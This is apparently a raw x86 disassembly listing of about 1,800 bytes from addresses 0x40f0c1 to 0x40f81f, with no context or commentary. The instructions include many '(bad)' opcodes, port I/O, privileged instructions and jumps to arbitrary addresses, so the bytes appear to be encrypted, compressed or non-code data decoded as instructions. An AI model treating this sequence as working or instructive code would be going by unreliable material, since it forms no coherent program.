  40f0c1:	inc    esi
  40f0c2:	or     esp,eax
  40f0c4:	aam    0xa2
  40f0c6:	in     al,dx
  40f0c7:	aam    0x1a
  40f0c9:	push   ebx
  40f0ca:	in     al,dx
  40f0cb:	int3   
  40f0cc:	xchg   esp,eax
  40f0cd:	xor    al,0xfc
  40f0cf:	mov    cl,BYTE PTR [edi+0x63fc99a4]
  40f0d5:	pop    esp
  40f0d6:	ret    0x3c6d
  40f0d9:	fistp  WORD PTR ds:[ebp-0xe4fc700]
  40f0e0:	xor    edx,DWORD PTR es:[esi+edx*1]
  40f0e4:	in     eax,dx
  40f0e5:	rcr    DWORD PTR [edi],1
  40f0e7:	pushf  
  40f0e8:	out    dx,eax
  40f0e9:	and    dh,BYTE PTR [ecx]
  40f0eb:	push   ecx
  40f0ec:	pop    ebp
  40f0ed:	push   ecx
  40f0ee:	ds push esp
  40f0f0:	xor    esp,edi
  40f0f2:	popa   
  40f0f3:	xor    al,ch
  40f0f5:	enter  0xbd51,0x4
  40f0f9:	mov    ss,WORD PTR [edi-0x20]
  40f0fc:	push   eax
  40f0fd:	pop    ebp
  40f0fe:	xchg   ebp,eax
  40f0ff:	add    ebp,DWORD PTR [esi-0x31]
  40f102:	xchg   ebp,eax
  40f103:	iret   
  40f104:	xchg   ebp,eax
  40f105:	sub    dl,BYTE PTR [edi-0x442f96f9]
  40f10b:	sub    ebp,ecx
  40f10d:	xchg   ecx,eax
  40f10e:	loopne 0x40f134
  40f110:	push   0x2e
  40f112:	test   al,0x9b
  40f114:	xchg   esi,eax
  40f115:	hlt    
  40f116:	ret    
  40f117:	push   0xbb269508
  40f11c:	les    edi,FWORD PTR [ebx+0x34]
  40f11f:	dec    edi
  40f120:	nop
  40f121:	sub    ax,si
  40f124:	pop    fs
  40f126:	bound  ecx,QWORD PTR [eax-0x11]
  40f129:	add    edx,ebp
  40f12b:	add    esi,DWORD PTR [ebp-0x5b]
  40f12e:	pop    ecx
  40f12f:	xchg   ebp,eax
  40f130:	stos   DWORD PTR es:[edi],eax
  40f131:	mov    DWORD PTR [edx+eiz*4-0x57],esp
  40f135:	scas   eax,DWORD PTR es:[edi]
  40f136:	and    cl,BYTE PTR [ecx-0xa]
  40f139:	or     esp,esi
  40f13b:	test   BYTE PTR [esi+0x68],bl
  40f13e:	mov    dh,0xf9
  40f140:	ror    BYTE PTR [eax],1
  40f142:	lods   al,BYTE PTR ds:[esi]
  40f143:	outs   dx,DWORD PTR ds:[esi]
  40f144:	dec    ebx
  40f145:	xor    al,0xac
  40f147:	ins    DWORD PTR es:[edi],dx
  40f148:	push   edx
  40f149:	test   BYTE PTR [ebx-0x5018823e],0x74
  40f150:	push   ebp
  40f151:	pop    ss
  40f152:	xchg   DWORD PTR [eax+0x65],eax
  40f155:	lds    edi,FWORD PTR [ebx+ecx*2+0x2e]
  40f159:	cmp    BYTE PTR [eax-0x4a7cbfd4],bh
  40f15f:	mov    WORD PTR [edx],fs
  40f161:	into   
  40f162:	popa   
  40f163:	jb     0x40f109
  40f165:	sbb    ah,BYTE PTR [ebx]
  40f167:	aaa    
  40f168:	xor    ecx,DWORD PTR [ebx+0x6a931e1f]
  40f16e:	lahf   
  40f16f:	ins    BYTE PTR es:[edi],dx
  40f170:	xchg   edi,eax
  40f171:	push   ecx
  40f172:	jne    0x40f12b
  40f174:	ja     0x40f170
  40f176:	loop   0x40f179
  40f178:	(bad)  
  40f179:	fadd   QWORD PTR [ebx+0x3fcb8a59]
  40f17f:	adc    eax,0x97fb74d9
  40f184:	imul   ecx,ebx,0xffffffe3
  40f187:	mov    al,ds:0xdb4927b4
  40f18c:	sbb    eax,0xe614497b
  40f191:	xor    al,0x77
  40f193:	xor    eax,0x77f61c9f
  40f198:	mov    al,ds:0xcf177f15
  40f19d:	mov    al,0xb9
  40f19f:	jb     0x40f1be
  40f1a1:	jmp    0x40f124
  40f1a3:	sub    BYTE PTR [esi],dh
  40f1a5:	and    BYTE PTR [ebp+0x2d5101d7],dl
  40f1ab:	icebp  
  40f1ac:	dec    esi
  40f1ad:	xor    cl,BYTE PTR [edx]
  40f1af:	ficom  WORD PTR [ebx-0x4c]
  40f1b2:	dec    ebp
  40f1b3:	jg     0x40f141
  40f1b5:	iret   
  40f1b6:	and    BYTE PTR [edi-0x3a3c1672],al
  40f1bc:	fadd   DWORD PTR [eax]
  40f1be:	outs   dx,DWORD PTR ds:[esi]
  40f1bf:	inc    edi
  40f1c0:	mov    al,ds:0xde28a79e
  40f1c5:	cmp    eax,DWORD PTR [edx]
  40f1c7:	mov    ds:0xb4b899b7,eax
  40f1cc:	add    ebp,DWORD PTR [esi]
  40f1ce:	cmp    DWORD PTR [ecx-0x2d7e713d],edx
  40f1d4:	in     al,dx
  40f1d5:	pop    ebp
  40f1d6:	sub    dh,BYTE PTR [ecx]
  40f1d8:	mov    ebp,0xb74e753c
  40f1dd:	mov    eax,ds:0x1bd46ffa
  40f1e2:	xlat   BYTE PTR ds:[ebx]
  40f1e3:	jle    0x40f19b
  40f1e5:	sbb    BYTE PTR [ecx+0x2e397846],0x31
  40f1ec:	adc    ebx,DWORD PTR fs:[edx+0x52]
  40f1f0:	push   eax
  40f1f1:	sub    DWORD PTR [ebx-0x132c319c],ebx
  40f1f7:	imul   edx,DWORD PTR [esp+eiz*4],0x19c47021
  40f1fe:	push   es
  40f1ff:	cmp    bl,BYTE PTR [eax+0x4b]
  40f202:	or     al,0x8c
  40f204:	mov    DWORD PTR [edi+edx*8],edx
  40f207:	dec    ebx
  40f208:	shl    bl,1
  40f20a:	mov    ebp,0xf49eccfa
  40f20f:	jp     0x40f19b
  40f211:	or     eax,0x6198915d
  40f216:	and    DWORD PTR [ebp+0x511d7816],0x36137c16
  40f220:	test   BYTE PTR [esi],dh
  40f222:	xchg   esp,eax
  40f223:	data16 and al,0x6c
  40f226:	fisttp DWORD PTR [ebx-0x25]
  40f229:	sbb    al,0x75
  40f22b:	shr    BYTE PTR [ebx+0x14d3012e],cl
  40f231:	imul   ebx,DWORD PTR [ecx-0x48529e92],0xe6d53722
  40f23b:	push   edi
  40f23c:	rcr    DWORD PTR [eax+0x20e964c3],1
  40f242:	mov    bh,0x7
  40f244:	iret   
  40f245:	xchg   esp,eax
  40f246:	rol    WORD PTR [eax-0x46],1
  40f24a:	cmp    bl,bh
  40f24c:	js     0x40f1f2
  40f24e:	pop    esi
  40f24f:	hlt    
  40f250:	sbb    BYTE PTR [ebp+0x7a3d55c3],0x7d
  40f257:	pusha  
  40f258:	adc    eax,0x53d5c04a
  40f25d:	cwde   
  40f25e:	cs jns 0x40f206
  40f261:	xor    eax,ebp
  40f263:	adc    ah,BYTE PTR [ebx+ebx*2]
  40f266:	je     0x40f228
  40f268:	inc    edx
  40f269:	mov    ebx,0x3ba11a1
  40f26e:	popf   
  40f26f:	popf   
  40f270:	adc    al,0x9a
  40f272:	add    edi,DWORD PTR [ebx+0x1b4884c1]
  40f278:	mov    BYTE PTR [edx-0x24],ch
  40f27b:	js     0x40f2f2
  40f27d:	jno    0x40f29f
  40f27f:	or     al,0x55
  40f281:	mov    cl,0x8c
  40f283:	daa    
  40f284:	and    cl,bh
  40f286:	mov    bl,0x12
  40f288:	cs lahf 
  40f28a:	xchg   esi,eax
  40f28b:	lods   eax,DWORD PTR ds:[esi]
  40f28c:	push   ecx
  40f28d:	in     eax,0x30
  40f28f:	daa    
  40f290:	inc    esp
  40f291:	outs   dx,BYTE PTR ds:[esi]
  40f292:	push   esi
  40f293:	pushf  
  40f294:	addr16 jl 0x40f2a6
  40f297:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f298:	(bad)  
  40f29a:	leave  
  40f29b:	cli    
  40f29c:	fisubr DWORD PTR [esi+0x10889ae5]
  40f2a2:	pop    edi
  40f2a3:	sub    ah,al
  40f2a5:	mov    bl,0x7d
  40f2a7:	dec    edi
  40f2a8:	add    BYTE PTR [esp+edx*2+0x663175d2],cl
  40f2af:	mov    edi,0x61ac07c7
  40f2b4:	cmp    ebp,DWORD PTR [eax]
  40f2b6:	inc    eax
  40f2b7:	loopne 0x40f31e
  40f2b9:	sub    DWORD PTR [esi+0x747050e4],eax
  40f2bf:	out    dx,al
  40f2c0:	xor    eax,0xbd2146d5
  40f2c5:	add    eax,0xa08dcf89
  40f2ca:	mov    al,ds:0xc956f068
  40f2cf:	pop    es
  40f2d0:	jl     0x40f26f
  40f2d2:	or     DWORD PTR [edi-0x79c15906],eax
  40f2d8:	aad    0x71
  40f2da:	xor    edi,DWORD PTR [edx-0x6b]
  40f2dd:	inc    esi
  40f2de:	sar    BYTE PTR [esi+0x68],cl
  40f2e1:	push   ebx
  40f2e2:	dec    eax
  40f2e3:	dec    esi
  40f2e4:	(bad)  
  40f2e5:	mov    eax,0xd94cc4a
  40f2ea:	sub    ecx,esp
  40f2ec:	je     0x40f34f
  40f2ee:	(bad)  
  40f2ef:	push   esp
  40f2f0:	icebp  
  40f2f1:	fst    QWORD PTR [edi-0x5b]
  40f2f4:	add    cl,BYTE PTR [edx-0x6b]
  40f2f7:	imul   eax,DWORD PTR [edx+0x1b3f8987],0xd1937b1d
  40f301:	sub    esp,DWORD PTR [eax]
  40f303:	adc    edx,DWORD PTR [ebp+0x5a15b56a]
  40f309:	lock inc esi
  40f30b:	das    
  40f30c:	mov    ecx,0xd86b3593
  40f311:	push   ecx
  40f312:	xchg   ecx,eax
  40f313:	mov    dh,0x7c
  40f315:	(bad)  
  40f316:	(bad)  
  40f317:	shl    DWORD PTR [edx],1
  40f319:	fidiv  WORD PTR [esi+0x7f5b5d39]
  40f31f:	in     eax,0x36
  40f321:	xchg   BYTE PTR [edi-0x6d],ah
  40f324:	and    BYTE PTR [edi],dl
  40f326:	addr16 leave 
  40f328:	test   BYTE PTR [edx+0x3c6a8225],0x2f
  40f32f:	ret    0x2a7a
  40f332:	cmp    dl,ah
  40f334:	stos   BYTE PTR es:[edi],al
  40f335:	ja     0x40f378
  40f337:	xchg   BYTE PTR [eax],al
  40f339:	push   ds
  40f33a:	ins    BYTE PTR es:[edi],dx
  40f33b:	mov    esp,0x31c3c18f
  40f340:	xchg   ebp,eax
  40f341:	adc    eax,0xab5d666
  40f346:	call   0x8f717913
  40f34b:	pop    edi
  40f34c:	scas   eax,DWORD PTR es:[edi]
  40f34d:	mov    al,ds:0x7afa849a
  40f352:	mov    eax,ds:0x3e7c499c
  40f357:	pop    ebx
  40f358:	fs aaa 
  40f35a:	mov    ds:0x65be6358,eax
  40f35f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f360:	push   esi
  40f361:	xor    BYTE PTR [ecx],bl
  40f363:	jmp    0xde4878b2
  40f368:	sbb    al,0x50
  40f36a:	mov    ds:0x43a0fb76,al
  40f36f:	fdivr  st,st(1)
  40f371:	rcl    DWORD PTR [ecx+0x119896af],cl
  40f377:	mov    ds:0xc05f9e39,al
  40f37c:	mov    ch,0xa5
  40f37e:	cld    
  40f37f:	repnz sub eax,0xe2da0fe9
  40f385:	dec    ebp
  40f386:	xlat   BYTE PTR ds:[ebx]
  40f387:	jo     0x40f370
  40f389:	mov    bl,BYTE PTR [edi]
  40f38b:	nop
  40f38c:	mov    ecx,0xc29cf22e
  40f391:	xchg   BYTE PTR [edi+0x235a0921],bl
  40f397:	pop    ds
  40f398:	fidiv  DWORD PTR [esi+0x32b8123d]
  40f39e:	mov    eax,0x4fb6f411
  40f3a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3a4:	lea    ebp,[ebx+0x61]
  40f3a7:	xchg   ecx,eax
  40f3a8:	mov    esp,gs
  40f3aa:	mov    ebp,0xcd029ec6
  40f3af:	bound  edi,QWORD PTR [ebp-0xb]
  40f3b2:	bswap  edx
  40f3b4:	or     BYTE PTR ds:0x3bb4b1ca,ch
  40f3ba:	jmp    ebx
  40f3bc:	in     eax,dx
  40f3bd:	push   ebp
  40f3be:	dec    ebx
  40f3bf:	cld    
  40f3c0:	cdq    
  40f3c1:	adc    dl,BYTE PTR [ebp+0x6475f07f]
  40f3c7:	out    0xe8,eax
  40f3c9:	mov    edx,0xebf30770
  40f3ce:	rcr    BYTE PTR [ebx],cl
  40f3d0:	setle  BYTE PTR [edx+0x52b394ec]
  40f3d7:	push   ss
  40f3d8:	imul   ebx,DWORD PTR ds:0xdc53bd0b,0x8b73bd03
  40f3e2:	add    edx,DWORD PTR [eax+0x6af572ae]
  40f3e8:	jb     0x40f38a
  40f3ea:	fmul   QWORD PTR [ebx+0x7f0b0cc8]
  40f3f0:	mov    BYTE PTR [ebx-0x4da476f],ch
  40f3f6:	or     eax,ebp
  40f3f8:	ror    DWORD PTR [eax],1
  40f3fa:	dec    edx
  40f3fb:	stc    
  40f3fc:	mov    esp,0x8189c712
  40f401:	dec    ebx
  40f402:	shl    DWORD PTR [esi-0x7e],cl
  40f405:	xlat   BYTE PTR ds:[ebx]
  40f406:	lods   al,BYTE PTR ds:[esi]
  40f407:	cmp    DWORD PTR [edi+esi*1-0x22d17b59],ebp
  40f40e:	dec    esi
  40f40f:	mov    ds:0xa57d915a,eax
  40f414:	fs xchg ecx,eax
  40f416:	add    al,0x42
  40f418:	hlt    
  40f419:	fwait
  40f41a:	imul   edx,DWORD PTR [edx-0x64],0xa071eee2
  40f421:	adc    ch,BYTE PTR [ecx+edi*4]
  40f424:	cli    
  40f425:	sub    cl,BYTE PTR [ebx-0x70]
  40f428:	retf   
  40f429:	mov    DWORD PTR [eax],edi
  40f42b:	adc    ebp,DWORD PTR [ebx-0x23276b6]
  40f431:	sbb    eax,0x6b303db3
  40f436:	lods   al,BYTE PTR ds:[esi]
  40f437:	jno    0x40f3ef
  40f439:	mov    ch,bh
  40f43b:	or     ebp,DWORD PTR [edx-0xe]
  40f43e:	data16 mov bl,0x8f
  40f441:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40f443:	ja     0x40f48f
  40f445:	in     al,dx
  40f446:	fwait
  40f447:	sbb    al,BYTE PTR [ecx-0x8e38285]
  40f44d:	jg     0x40f401
  40f44f:	into   
  40f450:	add    ah,bl
  40f452:	mov    bl,0x39
  40f454:	xchg   ecx,eax
  40f455:	pop    ds
  40f456:	add    DWORD PTR [eax],esp
  40f458:	xor    BYTE PTR [ebp-0x5d],dh
  40f45b:	xlat   BYTE PTR ds:[ebx]
  40f45c:	in     al,dx
  40f45d:	imul   ebx,DWORD PTR [esi+0x417a24b3],0x2115f271
  40f467:	rcl    DWORD PTR [eax-0x6b72f2d4],cl
  40f46d:	lock or dl,bl
  40f470:	aas    
  40f471:	ins    DWORD PTR es:[edi],dx
  40f472:	call   0x2f8b:0x2f2d09ad
  40f479:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f47a:	leave  
  40f47b:	jp     0x40f451
  40f47d:	jns    0x40f442
  40f47f:	push   edx
  40f480:	(bad)  
  40f481:	das    
  40f482:	xchg   BYTE PTR [ecx+0x70],bh
  40f485:	sub    BYTE PTR [ecx-0x55],ch
  40f488:	aas    
  40f489:	jae    0x40f441
  40f48b:	out    dx,al
  40f48c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f48d:	and    esi,esp
  40f48f:	mov    edx,0xf15c0037
  40f494:	out    dx,al
  40f495:	pop    ebx
  40f496:	rol    bl,1
  40f498:	lods   eax,DWORD PTR ds:[esi]
  40f499:	dec    eax
  40f49a:	and    eax,0xb143f4fa
  40f49f:	mov    WORD PTR [ebp-0x5c],es
  40f4a2:	xchg   ecx,eax
  40f4a3:	xchg   ebp,eax
  40f4a4:	jp     0x40f429
  40f4a6:	add    BYTE PTR [edx-0x52dc7e84],0xe1
  40f4ad:	and    BYTE PTR [ebx+0x650dd408],bh
  40f4b3:	imul   edx,DWORD PTR [edi],0x12286a6f
  40f4b9:	stos   BYTE PTR es:[edi],al
  40f4ba:	push   ss
  40f4bb:	xor    eax,0x5faeaf43
  40f4c0:	inc    esi
  40f4c1:	pusha  
  40f4c2:	xor    ch,BYTE PTR [ebp-0x34e7c109]
  40f4c8:	inc    edx
  40f4ca:	iret   
  40f4cb:	std    
  40f4cc:	xlat   BYTE PTR ds:[ebx]
  40f4cd:	lahf   
  40f4ce:	jmp    0x3f80:0x1dcf4154
  40f4d5:	add    bl,bl
  40f4d7:	popa   
  40f4d8:	daa    
  40f4d9:	jo     0x40f4cb
  40f4db:	outs   dx,BYTE PTR ds:[esi]
  40f4dc:	and    bl,BYTE PTR [ebp-0x63]
  40f4df:	sbb    BYTE PTR [ecx-0x28],ch
  40f4e2:	dec    ecx
  40f4e3:	inc    ebp
  40f4e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4e5:	jge    0x40f4b7
  40f4e7:	imul   ebp,DWORD PTR [ebx-0x17133308],0x5
  40f4ee:	test   BYTE PTR [esi+0x140ad69],cl
  40f4f4:	xchg   DWORD PTR ds:0x4ede5c78,esp
  40f4fa:	fchs   
  40f4fc:	imul   eax,DWORD PTR [esi+0x6e],0xf5c573be
  40f503:	mov    ecx,0x95b160d6
  40f508:	cli    
  40f509:	xchg   esp,eax
  40f50a:	push   0x71
  40f50c:	pusha  
  40f50d:	stc    
  40f50e:	cmc    
  40f50f:	call   0x2f98:0x58678fc9
  40f516:	pop    esp
  40f517:	cmp    DWORD PTR [edi+ebp*8+0x745e08fb],eax
  40f51e:	adc    DWORD PTR [eax+ecx*1],eax
  40f521:	pop    edi
  40f522:	jae    0x40f523
  40f524:	(bad)  [edx-0x48]
  40f527:	mov    ebp,0x8d7a8115
  40f52c:	mov    dh,0x5
  40f52e:	enter  0xefea,0x59
  40f532:	mul    BYTE PTR [ebp+0x40]
  40f535:	inc    ebp
  40f536:	inc    eax
  40f537:	mov    al,ch
  40f539:	push   edi
  40f53a:	mov    edx,0xc525a672
  40f53f:	sbb    bl,BYTE PTR [edx-0x3d]
  40f542:	mov    ecx,0xba47a18a
  40f547:	in     eax,0x49
  40f549:	mov    esp,0x154e3d53
  40f54e:	pop    edi
  40f54f:	sahf   
  40f550:	dec    esp
  40f551:	dec    esi
  40f552:	fisub  WORD PTR [ebx]
  40f554:	add    DWORD PTR [edx-0x1bfe758],ecx
  40f55a:	xor    DWORD PTR [ebp-0xc],ecx
  40f55d:	ja     0x40f51d
  40f55f:	setno  BYTE PTR [edi]
  40f562:	(bad)  
  40f563:	mov    eax,ds:0xf44fe825
  40f568:	sub    eax,DWORD PTR [ecx-0x43b6fbb1]
  40f56e:	mov    esp,0xfc8ad4f5
  40f573:	inc    eax
  40f574:	ror    DWORD PTR ds:0x19a5c946,1
  40f57a:	push   edx
  40f57b:	pop    eax
  40f57c:	dec    eax
  40f57d:	test   eax,0x626320f4
  40f582:	rol    DWORD PTR [ecx+ebp*2+0x4b4fd78f],1
  40f589:	push   es
  40f58a:	lods   al,BYTE PTR ds:[esi]
  40f58b:	and    BYTE PTR [eax],dh
  40f58d:	dec    esi
  40f58e:	shl    BYTE PTR [esi-0x19],0xeb
  40f592:	stc    
  40f593:	imul   ebx,DWORD PTR [edx-0x1f],0x1a7a60d9
  40f59a:	adc    al,0x8e
  40f59c:	pop    eax
  40f59d:	and    eax,0xb9ce56fd
  40f5a2:	ins    BYTE PTR es:[edi],dx
  40f5a3:	fdivr  QWORD PTR [ebx-0x48]
  40f5a6:	xchg   ebx,eax
  40f5a7:	cmp    al,0x64
  40f5a9:	call   0x1aca4787
  40f5ae:	mov    ecx,0x9e67ad3b
  40f5b3:	mov    edx,0x17debfc4
  40f5b8:	mov    ds:0x672a6d8a,eax
  40f5bd:	ins    BYTE PTR es:[edi],dx
  40f5be:	mov    ebx,0x2127490
  40f5c3:	inc    ebx
  40f5c4:	pop    esi
  40f5c5:	int3   
  40f5c6:	out    dx,al
  40f5c7:	xor    ecx,DWORD PTR [ecx+0x4130173a]
  40f5cd:	fidiv  WORD PTR [ebx]
  40f5cf:	cs scas eax,DWORD PTR es:[edi]
  40f5d1:	mov    cs,eax
  40f5d3:	int    0xda
  40f5d5:	out    0x7c,al
  40f5d7:	ja     0x40f648
  40f5d9:	aas    
  40f5da:	aas    
  40f5db:	inc    edi
  40f5dc:	xchg   DWORD PTR [edx+eax*2+0x2312f3f8],esp
  40f5e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5e4:	mov    al,ah
  40f5e6:	push   edx
  40f5e7:	fcmovu st,st(5)
  40f5e9:	fild   QWORD PTR [ebp-0x60]
  40f5ec:	jo     0x40f5f7
  40f5ee:	adc    ah,dh
  40f5f0:	hlt    
  40f5f1:	dec    edx
  40f5f2:	dec    edx
  40f5f3:	xchg   BYTE PTR [edx+0xf],ch
  40f5f6:	(bad)  
  40f5f7:	inc    DWORD PTR [ecx]
  40f5f9:	xchg   BYTE PTR [edi-0x21],ch
  40f5fc:	push   edx
  40f5fd:	or     edx,esi
  40f5ff:	jmp    0x9478a26b
  40f604:	push   ebx
  40f605:	ror    DWORD PTR [eax-0x7f],1
  40f608:	dec    edi
  40f609:	pop    edx
  40f60a:	cld    
  40f60b:	push   cs
  40f60c:	stos   BYTE PTR es:[edi],al
  40f60d:	add    al,0xad
  40f60f:	aas    
  40f610:	repnz xor eax,0xb5abb228
  40f616:	arpl   WORD PTR [ebp-0x20],ax
  40f619:	lods   al,BYTE PTR ds:[esi]
  40f61a:	jg     0x40f5cf
  40f61c:	or     DWORD PTR [ebx-0x264f43ba],edi
  40f622:	sahf   
  40f623:	xchg   ecx,eax
  40f624:	cmp    al,0x37
  40f626:	out    dx,eax
  40f627:	cmp    dl,BYTE PTR [esi+0x4]
  40f62a:	adc    bh,BYTE PTR [edx+0x43b85f5d]
  40f630:	in     eax,dx
  40f631:	or     ebx,DWORD PTR [edx+0x691afed8]
  40f637:	mov    edi,0xea4c420a
  40f63c:	cmc    
  40f63d:	jns    0x40f64c
  40f63f:	int3   
  40f640:	push   edi
  40f641:	add    BYTE PTR [eax+0x7edbbcb6],al
  40f647:	push   es
  40f648:	xlat   BYTE PTR ds:[ebx]
  40f649:	jns    0x40f628
  40f64b:	xchg   esi,eax
  40f64c:	push   edx
  40f64d:	pop    ebp
  40f64e:	js     0x40f678
  40f650:	jecxz  0x40f5fe
  40f652:	(bad)  
  40f653:	out    dx,al
  40f654:	jecxz  0x40f635
  40f656:	call   0xb91f:0x80c10278
  40f65d:	das    
  40f65e:	jge    0x40f5e5
  40f660:	cwde   
  40f661:	scas   eax,DWORD PTR es:[edi]
  40f662:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f663:	dec    edx
  40f664:	hlt    
  40f665:	cmp    DWORD PTR [eax+0x29],esi
  40f668:	(bad)  
  40f669:	cli    
  40f66a:	rcr    bl,0xaf
  40f66d:	xor    DWORD PTR [edx-0x20],ecx
  40f670:	arpl   cx,si
  40f672:	pop    eax
  40f673:	cmp    al,0xef
  40f675:	out    dx,eax
  40f676:	lods   al,BYTE PTR ds:[esi]
  40f677:	xchg   esi,eax
  40f678:	fldenv [ecx]
  40f67a:	lahf   
  40f67b:	pop    ss
  40f67c:	add    al,0xe6
  40f67e:	cli    
  40f67f:	mov    dl,ah
  40f681:	dec    ebx
  40f682:	nop
  40f683:	mov    edi,0x3dcbaf86
  40f688:	sub    BYTE PTR [ebx+0x30],bl
  40f68b:	sbb    bl,BYTE PTR [esi+0x5a0fa0f6]
  40f691:	pop    ebx
  40f692:	sub    BYTE PTR [eax-0x54e942fd],cl
  40f698:	repnz pop edx
  40f69a:	fs into 
  40f69c:	inc    eax
  40f69d:	iret   
  40f69e:	mov    al,ds:0x62e6956d
  40f6a3:	xor    DWORD PTR [eax-0x7d5c632d],ebx
  40f6a9:	sbb    al,0x1f
  40f6ab:	in     eax,dx
  40f6ac:	cmp    esp,edi
  40f6ae:	scas   eax,DWORD PTR es:[edi]
  40f6af:	icebp  
  40f6b0:	pop    ds
  40f6b1:	sub    edi,DWORD PTR [edx+edx*1-0x64]
  40f6b5:	call   0xeb457972
  40f6ba:	jb     0x40f6c6
  40f6bc:	loope  0x40f65a
  40f6be:	ss inc ebp
  40f6c0:	mov    WORD PTR [eax-0x571a8e30],ss
  40f6c6:	in     eax,0x7e
  40f6c8:	push   edx
  40f6c9:	popf   
  40f6ca:	adc    eax,0x9566e7b3
  40f6cf:	sub    DWORD PTR [esi+0x3f2fd4af],eax
  40f6d5:	nop
  40f6d6:	adc    bl,BYTE PTR [edx]
  40f6d8:	pop    edx
  40f6d9:	cld    
  40f6da:	inc    ecx
  40f6db:	setne  BYTE PTR [ecx+0x2c]
  40f6df:	ds pop es
  40f6e1:	test   BYTE PTR [ebp+0x7524349],0x46
  40f6e8:	mov    edx,0x7f3bd7be
  40f6ed:	sub    eax,0x5e980c9f
  40f6f2:	add    al,0xdb
  40f6f4:	mov    al,ds:0x963f8445
  40f6f9:	pop    edx
  40f6fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6fb:	setne  BYTE PTR [ecx-0x64c4c6d6]
  40f702:	adc    al,0x99
  40f704:	pop    ss
  40f705:	ins    DWORD PTR es:[edi],dx
  40f706:	inc    esi
  40f707:	xor    DWORD PTR [edx+edx*2-0x55],esi
  40f70b:	or     DWORD PTR [ecx-0x9],ecx
  40f70e:	loope  0x40f74e
  40f710:	gs dec eax
  40f712:	(bad)
  40f717:	bound  ebx,QWORD PTR [edx+0xc]
  40f71a:	fst    st(5)
  40f71c:	pushf  
  40f71d:	xor    eax,0xad6925c0
  40f722:	dec    ecx
  40f723:	sbb    BYTE PTR [ebp+0x3710d535],dh
  40f729:	pop    es
  40f72a:	jl     0x40f72d
  40f72c:	out    0x88,al
  40f72e:	add    BYTE PTR [esp+esi*8],bl
  40f731:	adc    al,0x52
  40f733:	pop    esp
  40f734:	or     ecx,DWORD PTR [edx-0x3b]
  40f737:	imul   ebx,DWORD PTR [eax+0x2dcec453],0xe59e8231
  40f741:	xchg   esp,eax
  40f742:	dec    edi
  40f743:	pop    DWORD PTR [edx+0x33761061]
  40f749:	test   DWORD PTR [ebx],ebx
  40f74b:	mov    bl,bl
  40f74d:	imul   esi,DWORD PTR [ecx],0xffffffe1
  40f750:	daa    
  40f751:	pop    ss
  40f752:	out    dx,eax
  40f753:	loop   0x40f6eb
  40f755:	bound  ebx,QWORD PTR [ebx+0x70]
  40f758:	out    dx,al
  40f759:	gs mov esp,0x47b2bb45
  40f75f:	adc    al,0x4c
  40f761:	jecxz  0x40f7b8
  40f763:	aas    
  40f764:	leave  
  40f765:	cs inc esp
  40f767:	int3   
  40f768:	push   eax
  40f769:	and    ch,dl
  40f76b:	push   es
  40f76c:	dec    esp
  40f76d:	sar    DWORD PTR [ecx*2-0x1fefac0a],cl
  40f774:	dec    esi
  40f775:	cmp    esi,DWORD PTR [ebx+0x66]
  40f778:	gs mov bl,0x24
  40f77b:	test   al,0x26
  40f77d:	cmp    DWORD PTR [edi],esp
  40f77f:	mov    ch,0xa2
  40f781:	in     al,0x13
  40f783:	retf   
  40f784:	scas   eax,DWORD PTR es:[edi]
  40f785:	ror    BYTE PTR ss:[ecx+0x79],0x59
  40f78a:	and    ebp,0xeef6a53d
  40f790:	clc    
  40f791:	xor    al,0x89
  40f793:	(bad)  
  40f794:	sbb    BYTE PTR [edx-0xe],bh
  40f797:	xchg   ebx,eax
  40f798:	pop    ds
  40f799:	(bad)  
  40f79a:	shl    BYTE PTR [ecx+0x7f21d532],cl
  40f7a0:	fdivr  DWORD PTR [eax]
  40f7a2:	mov    DWORD PTR [ebx+edx*8],edx
  40f7a5:	jle    0x40f76a
  40f7a7:	inc    esi
  40f7a8:	mov    cl,0xae
  40f7aa:	push   eax
  40f7ab:	cmp    DWORD PTR [edi-0x5c20a288],esp
  40f7b1:	fidiv  DWORD PTR ds:0x569edadb
  40f7b7:	fxam   
  40f7b9:	sub    eax,0x764f2400
  40f7be:	dec    ebx
  40f7bf:	push   eax
  40f7c0:	and    al,0x61
  40f7c2:	jo     0x40f758
  40f7c4:	cmp    eax,edi
  40f7c6:	outs   dx,BYTE PTR ds:[esi]
  40f7c7:	sub    esi,DWORD PTR [ecx+eiz*1]
  40f7ca:	mov    edi,DWORD PTR [ecx+0x68a22d61]
  40f7d0:	push   es
  40f7d1:	mov    al,0xb1
  40f7d3:	clc    
  40f7d4:	push   cs
  40f7d5:	push   ebp
  40f7d6:	pop    es
  40f7d7:	mov    edx,0xf9d0dabe
  40f7dc:	aam    0xc7
  40f7de:	in     al,0x56
  40f7e0:	fbld   TBYTE PTR [ecx+esi*1]
  40f7e3:	fs stos DWORD PTR es:[edi],eax
  40f7e5:	jno    0x40f7f2
  40f7e7:	and    BYTE PTR [esi+ebx*2+0x3ddfd456],al
  40f7ee:	lods   eax,DWORD PTR ds:[esi]
  40f7ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7f0:	inc    ebp
  40f7f1:	or     ecx,DWORD PTR [ebp-0x8]
  40f7f4:	popf   
  40f7f5:	call   0x2603:0x89d4ae61
  40f7fc:	xchg   esp,eax
  40f7fd:	xor    al,0x94
  40f7ff:	jp     0x40f790
  40f801:	push   ebx
  40f802:	and    al,0xff
  40f804:	push   esp
  40f805:	and    eax,edi
  40f807:	sbb    ebx,ebp
  40f809:	jge    0x40f7fb
  40f80b:	cmp    eax,0xcfbadd04
  40f810:	loopne 0x40f7bd
  40f812:	and    DWORD PTR [eax+0x35],edx
  40f815:	outs   dx,BYTE PTR ds:[esi]
  40f816:	adc    cl,BYTE PTR [eax]
  40f818:	lahf   
  40f819:	stos   BYTE PTR es:[edi],al
  40f81a:	xor    BYTE PTR [ecx],al
  40f81c:	(bad)  
  40f81d:	fwait
  40f81e:	retf   
  40f81f:	(bad)  
